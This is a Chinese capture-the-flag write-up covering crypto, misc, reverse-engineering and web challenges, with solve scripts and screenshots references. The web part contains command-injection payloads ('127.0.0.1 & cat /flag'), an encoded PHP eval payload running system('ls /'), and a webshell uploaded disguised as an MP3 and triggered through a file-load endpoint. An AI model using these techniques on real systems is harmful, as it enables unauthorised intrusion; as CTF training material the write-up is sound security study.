hint = [207815833858860472630525746720294722862686098236015762403351705374683468788325370179356514749526876950, 211015979308620411696525425095777275753476560571747569104626146643460892934355111246007348590054728278, 154982921170646039127386113914327168037474092849926050668784589159876343568545829713567339881566128774, 14301447927625534901480862591544923748585828474154787997664067408999800058813140550333919836238991874, 274602491551514790133598749654877237076653637818520480950523811116227833787921484758457209356323726695, 170369781650509946447172258827489337909221053707541176039704241960102824673107536295921548339896943064, 199159531778559581852282705906428311276685520954787407093495692307498420437271623202700142459262344361, 152127625735448140599545820146663204043528582114006890378053333070292552669943282154992607592819602345, 258118974363253374610905261929872690383062999526270455540048172948029807006984567635623967904079172525, 83791161992040915418707637123797436818204732030321155500557330793843135987740494961151450687354553588, 240283309715668400040909429066350841404133576389215959280394956765762171700654715262676050019779801415, 38842976594694523258855648781570648918799284259234846435828069057016223394465201311284210539158742069, 112124551443162148461799084208953311502063130294653691708825709872287471313112327095490868557801413814, 130493216949781764571166990014451012680060230560283908734192439983915035889157778838781734918556337718, 257057021216255933786617119107267370802049994234255480193196121654281929053027702977268758326889526999, 50825978665892428834553479141064382082596923815786131694407281600281500668374124718717621345592142201]

# 计算差值 d_i
d = []
for i in range(len(hint) - 1):
    d.append(hint[i+1] - hint[i])

# 计算 k_i = d_i * d_{i-2} - d_{i-1}^2
k_list = []
for i in range(2, len(d)):
    k = d[i] * d[i-2] - d[i-1]**2
    k_list.append(k)

# 计算 k_list 的 GCD 得到 p
gcd_val = abs(k_list[0])
for k in k_list[1:]:
    gcd_val = math.gcd(gcd_val, abs(k))
p = gcd_val
print("Recovered p =", p)

# 计算模逆元函数
def mod_inv(a, p):
    return pow(a, p-2, p)

# 恢复参数 a
a = None
for i in range(1, len(d)):
    if math.gcd(d[i-1], p) == 1:
        a = (d[i] * mod_inv(d[i-1], p)) % p
        break
if a is None:
    print("Failed to recover a")
    exit(1)
print("Recovered a =", a)

# 恢复消息 m
m = (hint[1] - a * hint[0]) % p
print("Recovered m =", m)

# 解密 flag
flag = long_to_bytes(m).decode()
print("Flag =", flag)
```

## MISC
### 我不要革命失败
使用windbg打开，在 WinDbg 命令行输入：

.symfix

.reload

然后输入以下命令<font style="color:rgba(0, 0, 0, 0.85);">详细显示蓝屏的原因、参数以及可能的进程信息。</font>

```plain
!analyze -v
```

```bash
14: kd> .symfix
14: kd> .reload
Loading Kernel Symbols
...............................................................
................................................................
................................................................
........................................
Loading User Symbols
Loading unloaded module list
......................
14: kd> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

CRITICAL_PROCESS_DIED (ef)
        A critical system process died
Arguments:
Arg1: ffffd18e9cfbc140, Process object
Arg2: 0000000000000000
Arg3: ffffd18e9cfbc140
Arg4: 0000000000000000

Debugging Details:
------------------


PROCESS_OBJECT: ffffd18e9cfbc140

CUSTOMER_CRASH_COUNT:  1

DEFAULT_BUCKET_ID:  CODE_CORRUPTION

BUGCHECK_STR:  0xEF

PROCESS_NAME:  svchost.exe

CURRENT_IRQL:  0

LAST_CONTROL_TRANSFER:  from fffff80317bb417b to fffff80317612740

STACK_TEXT:  
fffffc01`fe187858 fffff803`17bb417b : 00000000`000000ef ffffd18e`9cfbc140 00000000`00000000 ffffd18e`9cfbc140 : nt!KeBugCheckEx
fffffc01`fe187860 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!PspCatchCriticalBreak+0x11b


STACK_COMMAND:  kb

CHKIMG_EXTENSION: !chkimg -lo 50 -d !FLTMGR
    fffff80316663ab5-fffff80316663ab6  2 bytes - FLTMGR!DeleteStreamListCtrlCallback+35
	[ 48 ff:4c 8b ]
    fffff80316663abc-fffff80316663abf  4 bytes - FLTMGR!DeleteStreamListCtrlCallback+3c (+0x07)
	[ 0f 1f 44 00:e8 9f ea e4 ]
    fffff80316663aca-fffff80316663acb  2 bytes - FLTMGR!DeleteStreamListCtrlCallback+4a (+0x0e)
	[ 48 ff:4c 8b ]
    fffff80316663ad1-fffff80316663ad4  4 bytes - FLTMGR!DeleteStreamListCtrlCallback+51 (+0x07)
	[ 0f 1f 44 00:e8 5a a6 eb ]
    fffff80316663b1a-fffff80316663b1b  2 bytes - FLTMGR!DeleteStreamListCtrlCallback+9a (+0x49)
	[ 48 ff:4c 8b ]
    fffff80316663b21-fffff80316663b24  4 bytes - FLTMGR!DeleteStreamListCtrlCallback+a1 (+0x07)
	[ 0f 1f 44 00:e8 1a e9 eb ]
    fffff80316663b26-fffff80316663b27  2 bytes - FLTMGR!DeleteStreamListCtrlCallback+a6 (+0x05)
	[ 48 ff:4c 8b ]
    fffff80316663b2d-fffff80316663b30  4 bytes - FLTMGR!DeleteStreamListCtrlCallback+ad (+0x07)
	[ 0f 1f 44 00:e8 ee fb d9 ]
24 errors : !FLTMGR (fffff80316663ab5-fffff80316663b30)

MODULE_NAME: memory_corruption

IMAGE_NAME:  memory_corruption

FOLLOWUP_NAME:  memory_corruption

DEBUG_FLR_IMAGE_TIMESTAMP:  0

MEMORY_CORRUPTOR:  LARGE

FAILURE_BUCKET_ID:  X64_MEMORY_CORRUPTION_LARGE

BUCKET_ID:  X64_MEMORY_CORRUPTION_LARGE

Followup: memory_corruption
---------


```

根据结果

<font style="color:rgba(0, 0, 0, 0.85);">这里的</font>

```plain
PROCESS_NAME:  svchost.exe
```

<font style="color:rgba(0, 0, 0, 0.85);">就是真正崩溃的关键进程。</font>

<font style="color:rgba(0, 0, 0, 0.85);">崩溃类型：CRITICAL_PROCESS_DIED</font>

<font style="color:rgba(0, 0, 0, 0.85);">进程：svchost.exe</font>

<font style="color:rgba(0, 0, 0, 0.85);"></font>

### <font style="color:rgba(0, 0, 0, 0.85);">MISC城邦-压缩术</font>
爆破压缩包密码

![](/assets/docs/比赛wp/newstart/img-028.png)

伪加密修复

![](/assets/docs/比赛wp/newstart/img-029.png)

明文攻击

![](/assets/docs/比赛wp/newstart/img-030.png)

![](/assets/docs/比赛wp/newstart/img-031.png)



### 寻图
查看图片exif信息，厂商 Xiaomi，拍摄时间 2025:08:17 15:03:47

![](/assets/docs/比赛wp/newstart/img-032.png)

使用飞常准查询飞机的注册号，查看该航班的轨迹数据

![](/assets/docs/比赛wp/newstart/img-033.png)

发现一个符合的记录，到达时间是15：15，接近目的地，经过省会为武汉市

![](/assets/docs/比赛wp/newstart/img-034.png)



<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">flag{UQ3574_武汉市_Xiaomi}</font>

### 前有文字，所以搜索很有用
第一部分零宽隐写

![](/assets/docs/比赛wp/newstart/img-035.png)

base64解密 

![](/assets/docs/比赛wp/newstart/img-036.png)

第二部分snow隐写

key: brainfuckisgooooood

![](/assets/docs/比赛wp/newstart/img-037.png)



![](/assets/docs/比赛wp/newstart/img-038.png)

莫斯密码解密：0V3RC4ME_

![](/assets/docs/比赛wp/newstart/img-039.png)

第三部分：字频统计

![](/assets/docs/比赛wp/newstart/img-040.png)

 flag{yo0V3RC4ME_cH@1LenG3s}

### EZ_fence


![](/assets/docs/比赛wp/newstart/img-041.png)



![](/assets/docs/比赛wp/newstart/img-042.png)

<font style="color:rgb(0, 0, 0);background-color:rgb(248, 239, 211);">rSvMwgdouWZVhAvoj79GhSvWztPoyLfPytvQwJjBnKz=</font>

![](/assets/docs/比赛wp/newstart/img-043.png)

## 逆向
### Strange Base
f5看到密文

![](/assets/docs/比赛wp/newstart/img-044.png)

打开base64函数，这里有加密流程

![](/assets/docs/比赛wp/newstart/img-045.png)

<font style="color:rgba(0, 0, 0, 0.85);">找到编码表</font>

![](/assets/docs/比赛wp/newstart/img-046.png)

解密脚本

```bash
# 1. 自定义Base64编码表（从.rdata段提取，共64个字符）
custom_b64_table = "HElLo!A=CrQzy-B4S3|is'waITt1ng&Y0u^{/(>v<)*}GO~256789pPqWXVKJNMF"

# 2. 创建“字符→索引”映射（Base64解码核心：通过字符找到对应的6位数值）
char_to_index = {char: idx for idx, char in enumerate(custom_b64_table)}


def custom_base64_decode(encoded_str):
    """
    自定义Base64解码函数
    :param encoded_str: 编码后的字符串（如题目中的enc）
    :return: 解码后的原始字节数组
    """
    decoded_bytes = []
    # 处理填充符（=）：1个=表示解码后去掉最后1字节，2个=去掉最后2字节
    pad_count = encoded_str.count('=')
    # 去掉填充符，只保留有效编码字符
    encoded_str = encoded_str.rstrip('=')

    # 3. 每4个字符一组，解码为3个字节（Base64核心逻辑）
    for i in range(0, len(encoded_str), 4):
        # 取当前组的4个字符（最后一组可能不足4个，需补全）
        chunk = encoded_str[i:i + 4].ljust(4, '\x00')  # 不足4个时用空字符补位
        # 通过映射表获取每个字符对应的索引（0-63）
        try:
            idx0 = char_to_index[chunk[0]]
            idx1 = char_to_index[chunk[1]]
            idx2 = char_to_index[chunk[2]] if chunk[2] in char_to_index else 0
            idx3 = char_to_index[chunk[3]] if chunk[3] in char_to_index else 0
        except KeyError as e:
            raise ValueError(f"编码表中不存在字符: {e}")

        # 4. 6位索引组合为8位字节（核心计算）
        # 第1字节：idx0的6位 + idx1的前2位（idx1 >> 4）
        byte1 = (idx0 << 2) | (idx1 >> 4)
        # 第2字节：idx1的后4位（idx1 & 0x0F） + idx2的前4位（idx2 >> 2）
        byte2 = ((idx1 & 0x0F) << 4) | (idx2 >> 2)
        # 第3字节：idx2的后2位（idx2 & 0x03） + idx3的6位
        byte3 = ((idx2 & 0x03) << 6) | idx3

        # 将3个字节加入结果（根据填充符去掉多余字节）
        decoded_bytes.extend([byte1, byte2, byte3])

    # 5. 根据填充符数量剔除无效字节（1个=删1字节，2个=删2字节）
    if pad_count > 0:
        decoded_bytes = decoded_bytes[:-pad_count]

    return bytes(decoded_bytes)


# 6. 题目中的密文
encoded_flag = "T>6uTqOatL39aP!YIqruyv(YBA!8y7ouCa9="

# 7. 解码并输出flag
decoded_flag = custom_base64_decode(encoded_flag)
print("解码后的flag：", decoded_flag.decode('utf-8'))
```

### X0r
ida打开，f5

![](/assets/docs/比赛wp/newstart/img-047.png)

<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">解密思路</font>

<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">由于异或操作是可逆的（x ^ y ^ y = x），我们可以通过逆向操作来解密：</font>

1. <font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">对目标字符串进行第二轮异或（使用相同的 v5 数组）</font>
2. <font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">再进行第一轮异或（使用相同的规则）</font>
3. <font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">得到的结果就是原始 flag</font>

```bash
# 目标字符串（加密后的结果）
target = "anu`ym7wKLl$P]v3q%D]lHpi"
v5 = [19, 19, 81]  # 第二轮异或用的数组
result = list(target)  # 转成列表便于修改

# 先进行第二轮异或（逆向）
for j in range(len(result)):
    result[j] = chr(ord(result[j]) ^ v5[j % 3])

# 再进行第一轮异或（逆向）
for i in range(len(result)):
    if i % 3 == 0:
        result[i] = chr(ord(result[i]) ^ 0x14)
    elif i % 3 == 1:
        result[i] = chr(ord(result[i]) ^ 0x11)
    else:  # i % 3 == 2
        result[i] = chr(ord(result[i]) ^ 0x45)

# 组合成字符串并输出
flag = "".join(result)
print("Flag:", flag)


```



### Puzzle
ida打开，f5

![](/assets/docs/比赛wp/newstart/img-048.png)

点开puzzle_challenge()

![](/assets/docs/比赛wp/newstart/img-049.png)

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0.06);">发现第一段：Do_Y0u_</font>

ctri f12 发现：1e_Gam3

![](/assets/docs/比赛wp/newstart/img-050.png)

函数中有个可疑函数和可疑函数名

点开Like_7his_Jig函数，这是第二段

![](/assets/docs/比赛wp/newstart/img-051.png)

继续跟进下方函数

![](/assets/docs/比赛wp/newstart/img-052.png)

![](/assets/docs/比赛wp/newstart/img-053.png)

```bash
encrypted_array = [0xDE, 0xED, 0xDA, 0xF2, 0xDD, 0xD8, 0xD7, 0xD7]
key = 0xAD

part3 = ''.join([chr(b ^ key) for b in encrypted_array])
print("Part3:", part3)
```

Part3: s@w_puzz

合起来：flag{<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0.06);">Do_Y0u_Like_7his_Jigs@w_puzz</font>1e_Gam3}

### plzdebugme
f5，根据提示进行动调

![](/assets/docs/比赛wp/newstart/img-054.png)

使用ida的远程调试功能

![](/assets/docs/比赛wp/newstart/img-055.png)

kali上启用监听

![](/assets/docs/比赛wp/newstart/img-056.png)

在x0r下断点

![](/assets/docs/比赛wp/newstart/img-057.png)

![](/assets/docs/比赛wp/newstart/img-058.png)



### EzMyDroid
jadx打开

![](/assets/docs/比赛wp/newstart/img-059.png)

![](/assets/docs/比赛wp/newstart/img-060.png)

![](/assets/docs/比赛wp/newstart/img-061.png)

flag进行aes加密

```plain
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# 1. 配置关键参数
key = "1145141919810000".encode("utf-8")  # 密钥转 UTF-8 字节（16 字节 = AES-128）
cipher_text = "cTz2pDhl8fRMfkkJXfqs2t8JBsqLkvQZDLYpWjEtkLE="  # 目标密文

# 2. 密文 Base64 解码（还原为 AES 加密后的二进制数据）
cipher_data = base64.b64decode(cipher_text)

# 3. 创建 AES-ECB 解密器（ECB 模式无需 IV）
cipher = AES.new(key, AES.MODE_ECB)

# 4. 解密 + 去除 PKCS7 填充（还原明文字节）
plain_data = unpad(cipher.decrypt(cipher_data), AES.block_size, style="pkcs7")

# 5. 明文字节转 UTF-8 字符串
plain_text = plain_data.decode("utf-8")

# 输出结果
print("解密后的明文：", plain_text)
```

### 


# week2
## web
### DD加速器
127.0.0.1 & ls /

![](/assets/docs/比赛wp/newstart/img-062.png)

127.0.0.1 & cat /flag 发现假flag

127.0.0.1 & env

![](/assets/docs/比赛wp/newstart/img-063.png)



### 真的是签到诶
**<font style="color:rgb(0, 0, 0);">流程：</font>**

1. <font style="color:rgb(0, 0, 0);">接收的</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">cipher</font>`<font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">先</font><font style="color:rgb(0, 0, 0);"> </font>**<font style="color:rgb(0, 0, 0);">base64 解码</font>**
2. <font style="color:rgb(0, 0, 0);">再用</font><font style="color:rgb(0, 0, 0);"> </font>**<font style="color:rgb(0, 0, 0);">Atbash</font>**<font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">解码</font>
3. <font style="color:rgb(0, 0, 0);">去掉空格</font>
4. <font style="color:rgb(0, 0, 0);">再做</font><font style="color:rgb(0, 0, 0);"> </font>**<font style="color:rgb(0, 0, 0);">ROT13</font>**<font style="color:rgb(0, 0, 0);">（凯撒移位 13）</font>
5. <font style="color:rgb(0, 0, 0);">用</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">eval()</font>`<font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">执行最终得到的 PHP 代码</font>

直接逆推构造即可，可直接直接system('ls'),但是空格不能使用，通过  
<font style="color:rgb(15, 17, 21);">PHP 代码中使用转义序列 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">\40</font>`<font style="color:rgb(15, 17, 21);">（八进制表示空格）来替代空格。将原始代码中的 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">$code</font>`<font style="color:rgb(15, 17, 21);"> 修改为 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">system("ls\40/");</font>`<font style="color:rgb(15, 17, 21);">，然后经过编码后，解码执行的代码会正确运行 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">ls /</font>`<font style="color:rgb(15, 17, 21);">。</font>

```python
<?php
function atbash($text) {
    $result = '';
    foreach (str_split($text) as $char) {
        if (ctype_alpha($char)) {
            $is_upper = ctype_upper($char);
            $base = $is_upper ? ord('A') : ord('a');
            $offset = ord(strtolower($char)) - ord('a');
            $new_char = chr($base + (25 - $offset));
            $result .= $new_char;
        } else {
            $result .= $char;
        }
    }
    return $result;
}
$code = 'system("ls\40/");';       // 要执行的PHP代码
$code = str_rot13($code);         // 1. ROT13
$code = atbash($code);            // 2. Atbash
$cipher = base64_encode($code);   // 3. Base64

echo "cipher = $cipher\n";
?>
```

![](/assets/docs/比赛wp/newstart/img-064.png)

![](/assets/docs/比赛wp/newstart/img-065.png)



### 搞点哦润吉吃吃橘
查看源码，有账号密码

![](/assets/docs/比赛wp/newstart/img-066.png)

登陆后根据提示进行抓包

![](/assets/docs/比赛wp/newstart/img-067.png)

![](/assets/docs/比赛wp/newstart/img-068.png)

ai一个速算脚本，提取返回数据中的expression（表达式）、multiplier（乘数）和xor_value（XOR值）

从expression中使用正则表达式提取出数字部分，并根据挑战的计算公式进行计算， 使用正则表达式从`expression`中提取数字，计算`token, 将计算得到的``token`到`/verify_token`端点进行验证  

```python
import requests
import re
import json

def solve_challenge():
    # 目标URL
    base_url = "https://eci-2zebbaaa7atj30yo0v2l.cloudeci1.ichunqiu.com:5000/"

    # 初始Cookie（从浏览器复制）
    initial_cookies = {
        "Hm_lvt_2d0601bd28de7d49818249cf35d95943": "1757424418",
        "session": ".eJxNy0EKwyAQQNG7zNpFndAaXeceIu1ghImWyQiBkLun3bn-_53wXhMz1Uxx66zly4UEAk74QjPEXZNo1LIRBOue3rvZWzceR_s5h9PDojXALWf6xFIhqHQy0HeSmv4cliYNrhspJSkf.aOclpQ.4QWHKd0Nq9tixZ-lbIf7kPAppmA"
    }

    # 创建会话保持Cookie
    session = requests.Session()
    session.cookies.update(initial_cookies)

    start_headers = {
        "Host": "eci-2zebbaaa7atj30yo0v2l.cloudeci1.ichunqiu.com:5000",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "\"Windows\"",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
        "sec-ch-ua": "\"Google Chrome\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "Accept": "*/*",
        "Origin": base_url,
        "Sec-Fetch-Site": "same-origin",
        "Referer": f"{base_url}/home"
    }

    try:
        # 发送请求，启动挑战
        start_response = session.post(
            f"{base_url}/start_challenge",
            headers=start_headers,
            data=""
        )

        if start_response.status_code != 200:
            print(f"启动失败: {start_response.text}")
            return

        # 解析响应数据
        start_data = start_response.json()

        # 提取并更新session
        if 'Set-Cookie' in start_response.headers:
            set_cookie = start_response.headers['Set-Cookie']
            session_match = re.search(r'session=([^;]+)', set_cookie)
            if session_match:
                new_session = session_match.group(1)
                session.cookies.set('session', new_session)

        # 第二步：计算token
        expression = start_data.get('expression', '')
        multiplier = start_data.get('multiplier')
        xor_value_hex = start_data.get('xor_value')

        # 从表达式中提取第一个数字
        match = re.search(r'token = \((\d+) \* \d+\) \^ (0x[0-9a-fA-F]+)', expression)
        if match:
            first_number = int(match.group(1))
            xor_value = int(match.group(2), 16)

            # 计算token: (first_number * multiplier) ^ xor_value
            token_value = (first_number * multiplier) ^ xor_value
            print(f"计算过程: ({first_number} * {multiplier}) ^ {xor_value_hex}")

        else:
            # 如果正则匹配失败，尝试其他解析方式
            print("无法解析表达式，尝试直接计算...")
            # 这里可以根据实际情况调整计算逻辑
            return

        # 第三步：提交token
        print("提交")
        verify_headers = {
            "Host": "eci-2zebbaaa7atj30yo0v2l.cloudeci1.ichunqiu.com:5000",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Windows\"",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
            "sec-ch-ua": "\"Google Chrome\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"",
            "Content-Type": "application/json",
            "sec-ch-ua-mobile": "?0",
            "Accept": "*/*",
            "Origin": base_url,
            "Sec-Fetch-Site": "same-origin",
            "Referer": f"{base_url}/home"
        }

        verify_data = {
            "token": token_value
        }

        verify_response = session.post(
            f"{base_url}/verify_token",
            headers=verify_headers,
            json=verify_data
        )

        if verify_response.status_code == 200:
            verify_data = verify_response.json()

            if verify_data.get('success'):
                flag = verify_data.get('flag')
                print(f"成功获取Flag: {flag}")
            else:
                print("验证失败")
        else:
            print(f"验证请求失败: {verify_response.text}")

    except Exception as e:
        print(f"发生错误: {e}")

if __name__ == "__main__":
    solve_challenge()

```

![](/assets/docs/比赛wp/newstart/img-069.png)





### 白帽小K的故事（1）
查看源码

<font style="color:rgb(0, 0, 0);">在 JS 里限制上传的文件为mp3,上传一句话木马，重命名为cmd.mp3</font>

```python
const files = Array.from(e.dataTransfer.files).filter(
    f => f.type === 'audio/mpeg' || f.name.endsWith('.mp3')
);
```

![](/assets/docs/比赛wp/newstart/img-070.png)

上传成功

![](/assets/docs/比赛wp/newstart/img-071.png)

再看到源码的这个函数，<font style="color:rgb(0, 0, 0);">可通过 HTTP 请求</font>**<font style="color:rgb(0, 0, 0);">从后端加载某个文件的内容</font>**<font style="color:rgb(0, 0, 0);">，并在控制台输出结果，类似于文件包含</font>

```python
async function fetchload(file) {
            try {
                const res = await fetch('/v1/onload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `file=${encodeURIComponent(file)}`
                });
                const data = await res.json();
                if (data.success) {
                    console.log('File content:', data.success);
                } else {
                    console.error('Error loading file:', data.error);
                }
            } catch (e) {
                console.error('Request failed', e);
            }
        }

        fetchList();分析这个函数的功能
```

发送请求，成功访问到文件并执行了代码

![](/assets/docs/比赛wp/newstart/img-072.png)

重新上传一次，读取flag

![](/assets/docs/比赛wp/newstart/img-073.png)

![](/assets/docs/比赛wp/newstart/img-074.png)

## misc
### 日志分析-不敬者的闯入
![](/assets/docs/比赛wp/newstart/img-075.png)

![](/assets/docs/比赛wp/newstart/img-076.png)

![](/assets/docs/比赛wp/newstart/img-077.png)

### 美妙的音乐
Audacity打开

![](/assets/docs/比赛wp/newstart/img-078.png)

flag{thi5_1S_m1Di_5tEG0}



### OSINT-威胁情报
<font style="color:rgb(0, 0, 0);">通过</font>**<font style="color:rgb(0, 0, 0);">微步在线（</font>**[**<font style="color:rgb(9, 105, 218);">x.threatbook.cn</font>**](https://x.threatbook.cn/)**<font style="color:rgb(0, 0, 0);">）查询相关信息</font>**

![](/assets/docs/比赛wp/newstart/img-079.png)

<font style="color:rgb(0, 0, 0);">核心信息确认</font>

1. **<font style="color:rgb(0, 0, 0);">APT 组织名称</font>**<font style="color:rgb(0, 0, 0);">：报告中 “Tags”“Behavior activities”“Threats” 均明确指向 “kimsuky”（小写）；</font>
2. **<font style="color:rgb(0, 0, 0);">通信 C2 服务器域名</font>**<font style="color:rgb(0, 0, 0);">：DNS 请求中唯一非白名单（Reputation 为 unknown）且关联 Kimsuky APT 的域名为 “alps.travelmountain.ml”（小写）；</font>
3. **<font style="color:rgb(0, 0, 0);">恶意文件编译时间</font>**<font style="color:rgb(0, 0, 0);">：EXIF 字段 “TimeStamp” 提取 “年 - 月 - 日” 为 “2021-03-31”。</font>

![](/assets/docs/比赛wp/newstart/img-080.png)

### <font style="color:rgb(0, 0, 0);">最终 flag</font>
`<font style="color:rgb(0, 0, 0);">flag{kimsuky_alps.travelmountain.ml_2021-03-31}</font>`





## 密码
### 置换
置换 F 由两个置换复合而成：F = P ∘ Q，其中 P = (1 2 3 4 5 6 7)(8 9 10 11 12 13 14) 和 Q = (1 3 5 7)(2 4 6)(8 10 12 14)。解密需要应用 F 的逆置换 F⁻¹ = Q⁻¹ ∘ P⁻¹。



计算得到的解密映射（密文字母到明文字母）为：



A→E, B→G, C→F, D→A, E→B, F→C, G→D



H→L, I→N, J→I, K→H, L→K, M→J, N→M



O→O, P→P, Q→Q, R→R, S→S, T→T, U→U



V→V, W→W, X→X, Y→Y, Z→Z



下面是完整的解密脚本，直接使用计算好的解密映射：

```plain
def decrypt_message(ciphertext):
    """
    使用计算好的解密映射解密密文
    """
    decryption_map = {
        'A': 'E', 'B': 'G', 'C': 'F', 'D': 'A', 'E': 'B', 'F': 'C', 'G': 'D',
        'H': 'L', 'I': 'N', 'J': 'I', 'K': 'H', 'L': 'K', 'M': 'J', 'N': 'M',
        'O': 'O', 'P': 'P', 'Q': 'Q', 'R': 'R', 'S': 'S', 'T': 'T', 'U': 'U',
        'V': 'V', 'W': 'W', 'X': 'X', 'Y': 'Y', 'Z': 'Z'
    }

    result = []
    for char in ciphertext:
        if char.isalpha() and char.isupper():
            result.append(decryption_map[char])
        else:
            result.append(char)  # 保持非字母字符不变
    return ''.join(result)


# 密文
ciphertext = "SUFK_D_SJNPHA_PARNUTDTJOI_WJHH_GACJIJTAHY_IOT_STUNP_YOU."

# 解密
plaintext = decrypt_message(ciphertext)
print("密文:", ciphertext)
print("明文:", plaintext)

# 如果需要将下划线转换为空格，可以添加以下步骤：
readable_plaintext = plaintext.replace('_', ' ')
print("可读明文:", readable_plaintext)
```





















## 逆向


























## pwn
# week3
## web
### ez-chain


